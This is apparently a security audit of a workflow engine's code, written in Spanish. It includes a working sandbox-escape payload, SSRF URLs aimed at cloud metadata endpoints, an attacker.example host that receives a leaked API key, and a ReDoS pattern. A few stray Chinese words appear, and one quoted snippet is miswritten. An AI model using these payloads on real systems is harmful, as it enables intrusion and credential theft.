# Audit Report 03 — Workflow engine (workflow, nodes, triggers, a2e, connector)

## Hallazgos

### [SEVERIDAD: CRITICAL] Ejecución de código arbitrario (RCE) en nodo `code.run` con denylist bypaseable
- Archivo: core/nodes.js
- Línea: 235-249
- Evidencia:
```js
handler: async (inputs) => {
  if (!inputs.code) return inputs.data;
  const BLOCKED = ['process', 'require', 'import', 'eval', 'Function', 'fetch', 'globalThis', 'Bun', 'Deno'];
  for (const b of BLOCKED) {
    if (inputs.code.includes(b)) throw new Error(`Blocked keyword in code: ${b}`);
  }
  try {
    const fn = new Function('data', `"use strict"; return (function(data) { ${inputs.code} })(data);`);
    return fn(inputs.data);
```
- Descripción: `inputs.code` viene de la definición del workflow (controlada por quien arma el nodo) y se ejecuta con `new Function`, o sea RCE nativo. La "sandbox" es solo un `String.includes` (denylist por subcadena). Es trivialmente bypaseable: el escape canónico vía el constructor de Function obtenido de un objeto de error evita todos los literales bloqueados.
- Escenario de explotación concreto: un workflow con nodo `code.run` y `inputs.code` =
  `try { null.x } catch(e) { const F = e.constructor.constructor; const g = F('return glo'+'balThis')(); return g['pro'+'cess'].env }`
  no contiene ninguna subcadena bloqueada (`process`, `globalThis`, `Function`, `eval`, …) y devuelve `process.env` → lectura del entorno y, vía `process.mainModule.require`, RCE total del host.
- Sugerencia de fix: no usar `new Function` como sandbox (es RCE por diseño); ejecutar código de usuario solo en un worker/sandbox real (vm2-isolated, isolates) o eliminar el nodo `code.run`. Un denylist nunca es seguro.

### [SEVERIDAD: CRITICAL] SSRF sin validación en nodo `http.request` y nodos API
- Archivo: core/nodes.js
- Línea: 114-152 (`_executeApi`), 216-227 (preset `http.request`)
- Evidencia:
```js
const url = interpolate(node.url || inputs.url, inputs, credentials);
...
res = await fetch(url, { method, headers, body, signal: controller.signal });
```
- Descripción: la URL final se construye interpolando `node.url || inputs.url` con valores de inputs/controlados por el workflow, y se pasa a `fetch` sin filtrar esquema, host ni IPs. `http.request` toma `url` directamente de inputs. No hay denylist de localhost, RFC1918, link-local (`169.254.169.254`) ni `file://`.
- Escenario de explotación concreto: un workflow `{ nodes:[{ type:'http.request', inputs:{ url:'http://169.254.169.254/latest/meta-data/iam/security-credentials/' }}] }` → exfiltración de credenciales del cloud metadata endpoint; o `url:'http://localhost:5678/…'` para golpear servicios internos.
- Sugerencia de fix: resolver la URL contra una allowlist de hosts y bloquear destinos internos (localhost, 127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1) antes del `fetch`.

### [SEVERIDAD: CRITICAL] Recursión sin límite en el ejecutor DAG (a2e) → hang / stack overflow
- Archivo: core/a2e.js
- Línea: 629-695 (`_executeOp` / `_executeLoop`)
- Evidencia:
```js
if (op.type === 'Conditional') {
  result = handler(config, this.state);
  if (result?.executeOperationId) {
    await this._executeOp(result.executeOperationId, executionId);
  }
```
```js
// onError fallback
if (op.onError) {
  try {
    await this._executeOp(op.onError, executionId);
```
```js
for (const subOpId of subOps) {
  await this._executeOp(subOpId, 'loop');
```
- Descripción: `_executeOp` se llama recursivamente a sí mismo para: ramas de `Conditional` (`ifTrue`/`ifFalse`), fallbacks `onError`, y cada sub-operación de `Loop`. No hay contador de profundidad ni límite. Un `Conditional` cuya rama apunte al propio Conditional, un `onError` mutuamente referenciado, o un `Loop` cuyo `operations` incluya su propio opId produce recursión infinita que cuelga el proceso o agota el stack.
- Escenario de explotación/fallo concreto: op `C` con `config.ifTrue = "C"` → `execute()` nunca retorna (cada llamada reentrona otra); con `n` pequeño desborda el stack y crashea el runtime entero, no solo el workflow.
- Sugerencia de fix: pasar un `depth` en `_executeOp` y abortar (con error) al superar un máximo (p. ej. 50); además impedir que un Loop ejecute subOps que incluyan su propio opId.

### [SEVERIDAD: HIGH] SSRF en el poller de triggers
- Archivo: core/triggers.js
- Línea: 58-78
- Evidencia:
```js
const timer = setInterval(async () => {
  try {
    const res = await fetch(trigger.config.url, {
      headers: trigger.config.headers || {},
    });
    const data = await res.json();
```
- Descripción: la URL del poll se toma de `trigger.config.url` (definición de workflow, controlada por usuario) y se hace `fetch` sin validar destino. El motor de polling corre desde el lado servidor, así que esto es SSRF server-side persistente (se repite cada intervalo).
- Escenario concreto: trigger `{ type:'poll', config:{ url:'http://169.254.169.254/latest/meta-data/', interval:60000 }}` → el servidor golpea el metadata endpoint cada minuto y la respuesta (credenciales) alimenta al workflow vía `_onTrigger(...,{data})`.
- Sugerencia de fix: aplicar la misma allowlist/bloqueo de destinos internos que para los nodos HTTP antes de registrar el intervalo.

### [SEVERIDAD: HIGH] Webhook sin autenticación: disparo de workflow por path adivinable
- Archivo: core/triggers.js
- Línea: 52-53, 109-114
- Evidencia:
```js
case TriggerType.WEBHOOK:
  this._webhooks.set(trigger.config.path || workflowId, workflowId);
```
```js
fireWebhook(path, data) {
  const workflowId = this._webhooks.get(path);
  if (!workflowId) return null;
  this._onTrigger(workflowId, { trigger: 'webhook', data });
  return workflowId;
}
```
- Descripción: cualquier HTTP request que acierte el `path` (que por defecto es el `workflowId`) dispara la ejecución del workflow con el body entregado. No hay token/secreto/firma. Si el path es público o adivinable, un atacante dispara workflows arbitrarios y controla `triggerData` que llega a los nodos.
- Escenario concreto: POST a `/webhook/<workflowId>` ejecuta el workflow con body controlado por el atacante → ejecución de nodos con datos inyectados (p. ej. un `http.request`下游 cuyo `url` se interpola desde `_trigger`).
- Sugerencia de fix: exigir un secreto por webhook (`config.secret`) y verificarlo (header/token) en `fireWebhook` antes de disparar.

### [SEVERIDAD: HIGH] SSRF a localhost + API key configurable en `ExecuteN8nWorkflow`
- Archivo: core/a2e.js
- Línea: 186-197
- Evidencia:
```js
const n8nUrl = config.n8nApiKey || process.env.N8N_API_KEY || '';
const n8nUrl = config.n8nUrl || process.env.N8N_URL || 'http://localhost:5678';
...
const res = await fetch(`${n8nUrl}/api/v1/workflows/${config.workflowId}/run`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-N8N-API-KEY': apiKey },
  body: JSON.stringify({ data: payload }),
});
```
- Descripción: `n8nUrl` y `config.workflowId` son controlados por la definición de operación; no hay validación. Apunta por defecto a `http://localhost:5678`. Además `apiKey` proviene de `config.n8nApiKey` (campo de operación) y se inyecta como header en la请求, pudiendo filtrarse a un host atacante.
- Escenario concreto: op `ExecuteN8nWorkflow` con `config.n8nUrl:'http://attacker.example'` → el runtime envía `X-N8N-API-KEY` (si está en config/env) al host atacante, filtrando la credencial, y/o golpea `localhost:5678`.
- Sugerencia de fix: validar `n8nUrl` contra allowlist; nunca tomar credenciales de `config.*` (solo del vault/env); bloquear localhost/destinos internos.

### [SEVERIDAD: HIGH] SSRF en `ApiCall` (a2e)
- Archivo: core/a2e.js
- Línea: 167-183
- Evidencia:
```js
const url = resolvePath(state, config.url);
...
const res = await fetch(url, opts);
```
- Descripción: `config.url` puede ser un literal del workflow o un path resuelto desde el estado; `fetch` sin validación de destino. Mismo vector SSRF que los nodos HTTP pero en el ejecutor a2e.
- Escenario concreto: op `ApiCall` con `config.url:'/workflow/x'` donde `x` viene de un trigger externo y vale `http://169.254.169.254/…` → SSRF server-side.
- Sugerencia de fix: allowlist de hosts / bloqueo de destinos internos antes del `fetch`.

### [SEVERIDAD: HIGH] Poll con `interval: 0` → bucle ajustado (DoS local)
- Archivo: core/triggers.js
- Línea: 57-58
- Evidencia:
```js
const interval = trigger.config.interval || 60000;
const timer = setInterval(async () => { ... }, interval);
```
- Descripción: `setInterval` acepta `interval: 0` (o cualquier valor < un umbral razonable) y lanza el callback tan rápido como pueda el event loop. El callback es `async` y hace `fetch`; con `interval: 0` se apilan requests sin límite, saturando red/event loop y pudiendo colgar el proceso.
- Escenario concreto: trigger `{ type:'poll', config:{ url:'http://…', interval:0 }}` → cientos de fetches concurrentes encolados, DoS del runtime.
- Sugerencia de fix: clampear `interval` a un mínimo (p. ej. `Math.max(interval, 1000)`) y rechazar valores no positivos.

### [SEVERIDAD: MEDIUM] `masterKey` por defecto débil para el vault de credenciales
- Archivo: core/workflow.js
- Línea: 40
- Evidencia:
```js
this._vault = new CredentialVault(db, opts.masterKey || 'default-key');
```
- Descripción: si el caller no pasa `masterKey`, el vault de credenciales se inicializa con la clave literal `'default-key'`. Cualquier despliegue que olvide configurar la clave cifra todas las credenciales con una clave pública y conocida.
- Escenario concreto: instancia en producción sin `opts.masterKey` → credenciales cifradas con `default-key`, recuperables por cualquiera que lea el store.
- Sugerencia de fix: lanzar error si no se provee `masterKey` (no hay default); exigir longitud mínima.

### [SEVERIDAD: MEDIUM] El DAG ignora dependencias dinámicas (Conditional/onError) → carrera en ejecución paralela
- Archivo: core/a2e.js
- Línea: 80-96, 575-585
- Evidencia:
```js
const refs = configStr.match(/\/workflow\/([a-zA-Z0-9_-]+)/g) || [];
...
if (op.onError === depId) continue;   // se salta onError como dependencia
```
```js
for (const level of levels) {
  await Promise.all(level.map(opId => this._executeOp(opId, executionId)));
}
```
- Descripción: `buildDAG` excluye deliberadamente las referencias `onError` y no modela las ramas de `Conditional` (`ifTrue`/`ifFalse`) como aristas. El executor paralelo puede correr un op del mismo "nivel" que consume la salida de un `Conditional` antes de que éste resuelva su rama, o correr un op cuyo único "predecesor" es un `onError` aunque el op original aún no falló.
- Escenario concreto: op `A` (Conditional) y op `B` que referencia `/workflow/B`… si `B` consume `A` y caen en el mismo nivel, `B` lee `state` antes de que `A` escriba su rama → resultado `undefined` silencioso.
- Sugerencia de fix: modelar `onError` y ramas `Conditional` como aristas del DAG (no saltarlas) o ejecutar ops de control secuencialmente fuera del paralelismo.

### [SEVERIDAD: MEDIUM] `CacheMiddleware` cachea en `processConfig` pero nunca restaura el resultado
- Archivo: core/a2e.js
- Línea: 721-739
- Evidencia:
```js
processConfig(config, opType) {
  const key = `${opType}:${JSON.stringify(config)}`;
  const cached = this._cache.get(key);
  if (cached && Date.now() - cached.ts < this._ttl) {
    this.hits++;
    config._cached = cached.result;
  } else {
    this.misses++;
  }
  return config;
}

processResult(result, opType) {
  // Result is stored after execution
  return result;
}
```
- Descripción: el "hit" solo marca `config._cached` (que el handler ignora) y nunca persiste resultados nuevos en el cache (`this._cache.set` no se llama en ningún lado). El cache no cachea nada: todos los "hits" son inútiles y nada se almacena. Bug de correctness: la feature entera no funciona.
- Escenario concreto: dos ejecuciones idénticas de `ApiCall` → `stats()` muestra `misses=2, hits=0` y se repiten los fetch; el `_cached` queda como basura en el config.
- Sugerencia de fix: en `processResult`, guardar `this._cache.set(key, {result, ts: Date.now()})` y, en `processConfig`, cuando hay hit, devolver el resultado cacheado sin ejecutar (o marcarlo para saltar el handler).

### [SEVERIDAD: MEDIUM] ReDoS vía `RegExp` construido con input de usuario
- Archivo: core/a2e.js
- Línea: 364-371, 388-390
- Evidencia:
```js
const re = new RegExp(config.pattern, config.flags || 'g');
```
```js
case 'custom': {
  const re = new RegExp(config.pattern || '.*');
```
- Descripción: `config.pattern` y `config.flags` provienen de la definición de operación y se compilan a `RegExp` sin límite. Patrones catastróficamente retroactivos (`(a+)+$`) sobre entradas medianas cuelgan el event loop (DoS de un solo hilo). `flags` también permite `g`+`matchAll` con backtracking.
- Escenario concreto: `ExtractText` con `pattern:'(a+)+$'` y texto `'a'.repeat(30)+'!'` → regex catatrófica, bloquea el runtime.
- Sugerencia de fix: limitar complejitud del patrón (longitud/tiempo) o usar un timeout vía worker; rechazar flags peligrosos.

### [SEVERIDAD: MEDIUM] Errores del poller tragados silenciosamente; el intervalo sigue corriendo para siempre
- Archivo: core/triggers.js
- Línea: 75-77
- Evidencia:
```js
} catch (err) {
  console.error(`[Trigger] Poll error for ${workflowId}:`, err.message);
}
```
- Descripción: cualquier fallo del poll (red, JSON inválido, 500) se loguea a stderr y el `setInterval` continúa indefinidamente. No hay circuit-breaker ni contador de fallos consecutivos; un endpoint que siempre responde basura o cae deja un poller zombie que consume recursos sin notificar al sistema de errores.
- Escenario concreto: URL del poll cae → el poller reintenta cada minuto para siempre, solo a stderr, sin quedar como trigger en estado de error.
- Sugerencia de fix: llevar un contador de fallos consecutivos y desregistrar/marcar error tras N fallos; reportar vía callback de error.

### [SEVERIDAD: MEDIUM] `Connector` no valida destinos internos (SSRF genérico)
- Archivo: core/connector.js
- Línea: 63-75, 107-112
- Evidencia:
```js
url = path.startsWith('http') ? path : `${this.baseUrl}${path}`;
...
new URL(url); // validate
...
const response = await fetch(url, { method, headers, body: fetchBody, signal: controller.signal });
```
- Descripción: `new URL` sólo valida formato, no esquema/host. `path` absoluto (`startsWith('http')`) reemplaza el baseUrl, así que un caller que deje `path` controlable por datos externos expone SSRF. `baseUrl`/`path` no se filtran contra localhost/IPs internas.
- Escenario concreto: `connector.post('http://169.254.169.254/…', body)` o `baseUrl:'http://localhost:6379'` para Redis interno → acceso a servicios internos.
- Sugerencia de fix: opcionalmente, hook de validación de host/SSRF configurable; rechazar `file:`, localhost y rangos internos cuando el connector se marque como de confianza cero.

### [SEVERIDAD: MEDIUM] `_getFromContext` permite traversal por `__proto__` y no aísla por tenant
- Archivo: core/workflow.js
- Línea: 286-316
- Evidencia:
```js
_getFromContext(path, context) {
  const parts = path.split('.');
  let current = context;
  for (const p of parts) {
    if (current == null) return undefined;
    current = current[p];
  }
  return current;
}
```
- Descripción: una referencia `{{__proto__.constructor.name}}` (o `{{_trigger.__proto__…}}`) recorre la cadena de prototipo del objeto `context`/resultados. El `context` se comparte entre todos los nodos de un workflow y el motor no separa por tenant: los resultados de un nodo quedan en el mismo namespace plano (`context[node.id]`), y `_trigger` viene directo del caller del webhook. No hay namespace por workflow/tenant en las ejecuciones almacenadas.
- Escenario concreto: un webhook entrega `data.__proto__ = …` y un nodo `{{_trigger.__proto__.polluted}}` lo lee; o dos workflows que compartan `DocStore` sin prefijo de colección por tenant colisionan en `_workflows`/`_executions`.
- Sugerencia de fix: filtrar claves `__proto__`/`prototype`/`constructor` en `_getFromContext` y prefijar colecciones por tenant.

### [SEVERIDAD: LOW] `Math.max(...nums)` / `Math.min(...nums)` sobre arrays enormes desborda el stack
- Archivo: core/a2e.js
- Línea: 411-414
- Evidencia:
```js
case 'max': return Math.max(...nums);
case 'min': return Math.min(...nums);
```
- Descripción: spread de un array arbitrariamente grande en `Math.max`/`Math.min` coloca cada elemento como argumento en el stack; arrays > ~100k elementos pueden agotarlo.
- Escenario concreto: `Calculate` con `operation:'max'` sobre `input` de 500k números → `RangeError: Maximum call stack`.
- Sugerencia de fix: usar `nums.reduce((a,b)=>Math.max(a,b), -Infinity)`.

### [SEVERIDAD: LOW] Colisión de `node.id` sobreescribe resultados en el contexto
- Archivo: core/workflow.js
- Línea: 188-191
- Evidencia:
```js
const nodeResult = (result != null && result.data !== undefined) ? result.data : result;
context[node.id] = nodeResult;
execution.nodeResults[node.id] = { status: 'success', data: context[node.id], duration: null };
```
- Descripción: el contexto se indexa solo por `node.id` sin validar unicidad. Dos nodos con el mismo `id` (o uno que referencie a `_trigger`) hacen que el segundo pise el resultado del primero; los downstream que referencian `{{n1.data}}` leen el equivocado. No hay validación de IDs duplicados al crear/actualizar el workflow.
- Escenario concreto: workflow con `[{id:'n1',…},{id:'n1',…}]` → `nodeResults.n1` refleja solo el último; un `{{n1.data}}` silenciosamente apunta al resultado equivocado.
- Sugerencia de fix: rechazar `nodes` con `id` duplicado o reservado (`_trigger`) al `create`/`update`.

## Resumen
- Archivos revisados: 5/5 (workflow.js, nodes.js, triggers.js, a2e.js, connector.js)
- Hallazgos: 3 critical, 5 high, 7 medium, 2 low
- Sin hallazgos en: ninguno de los 5 estuvo libre de hallazgos. `connector.js` es el más limpio (solo SSRF genérico, esperable en un cliente HTTP sin política de confianza); su lógica de retries, timeout y parseo es correcta.